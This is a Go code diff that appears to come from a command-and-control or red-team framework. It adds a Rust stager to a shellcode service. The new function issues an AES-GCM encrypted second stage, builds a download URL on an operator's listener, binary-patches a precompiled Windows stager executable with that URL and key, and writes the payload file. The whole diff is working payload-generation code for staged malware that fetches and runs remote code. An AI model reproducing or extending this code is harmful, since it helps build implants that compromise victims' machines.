@@ -342,8 +342,14 @@ func (ss *ShellcodeService) GenerateStager(config ShellcodeConfig) (*StagerResul
 
 	ttl := stageTTL(config.StageTTLMinutes)
 
-	if config.StagerLang == "c" || config.StagerLang == "rust" {
+	if config.StagerLang == "c" {
 		return ss.generateCStager(config, listener, host, scheme, stage2, ttl)
+	}
+
+	// Rust stager: precompiled template + config patch (AES-GCM JSON protocol,
+	// like the Go stager, but no per-payload compilation).
+	if config.StagerLang == "rust" {
+		return ss.generateRustStager(config, listener, host, scheme, stage2, ttl)
 	}
 
 	if config.ReuseStage {
@@ -730,6 +736,42 @@ func stageSize(path string) int {
 		return int(fi.Size())
 	}
 	return 0
+}
+
+// generateRustStager builds the Rust stager EXE from the precompiled template
+// (bin/templates/stager_rust_template.exe): it issues an AES-GCM JSON stage
+// (same wire protocol as the Go stager) and binary-patches the template's
+// embedded config block (stage URL + AES key) — no per-payload compilation.
+func (ss *ShellcodeService) generateRustStager(config ShellcodeConfig, listener *db.ListenerRow, host, scheme string, stage2 []byte, ttl time.Duration) (*StagerResult, error) {
+	token, keyB64, err := ss.serverSvc.GetServer().IssueStage(stage2, ttl)
+	if err != nil {
+		return nil, fmt.Errorf("issue stage: %w", err)
+	}
+	stageURL := stageURL(scheme, host, listener.BindPort, token, listener)
+
+	tmplPath := filepath.Join(ss.templatesDir(), "stager_rust_template.exe")
+	tmpl, err := os.ReadFile(tmplPath)
+	if err != nil {
+		return nil, fmt.Errorf("Rust stager template not found: %w", err)
+	}
+	patched, err := stager.PatchRustStager(tmpl, stageURL, keyB64)
+	if err != nil {
+		return nil, fmt.Errorf("patch Rust stager: %w", err)
+	}
+
+	outPath := config.OutputPath
+	if outPath == "" {
+		outPath = filepath.Join(exeDir(), "payloads", fmt.Sprintf("stager_rust_%s_%s.exe", config.TargetOS, config.TargetArch))
+	}
+	if err := ss.writePayload(outPath, patched, 0755); err != nil {
+		return nil, err
+	}
+	return &StagerResult{
+		StagerPath: outPath,
+		StageURL:   stageURL,
+		Token:      token,
+		Size:       len(patched),
+	}, nil
 }
 
 // buildGoStager writes the stager template to a temp dir and compiles it for
